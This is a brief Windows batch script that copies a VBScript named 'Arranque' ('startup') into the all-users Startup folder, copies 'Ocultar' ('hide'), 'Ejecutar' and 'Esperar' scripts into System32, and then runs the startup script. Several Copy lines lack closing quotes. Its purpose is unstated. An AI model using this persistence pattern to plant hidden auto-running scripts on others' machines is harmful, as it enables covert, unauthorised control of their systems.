If Exist "%tmp%\Current.txt" (for /f "tokens=*" %%%% in ('More %tmp%\Current.txt') do (set HERE=%%~%%) & Del /q "%tmp%\Current.txt")

Set F1=Arranque.vbs
Set F2=Ocultar.vbs
Set F3=Ejecutar.bat
Set F4=Esperar.bat

Copy "%HERE%\%F1%" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\%F1%"
Copy "%HERE%\%F2%" "%WinDir%\System32\%F2%
Copy "%HERE%\%F3%" "%WinDir%\System32\%F3%
Copy "%HERE%\%F4%" "%WinDir%\System32\%F4%

"%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\%F1%"

Exit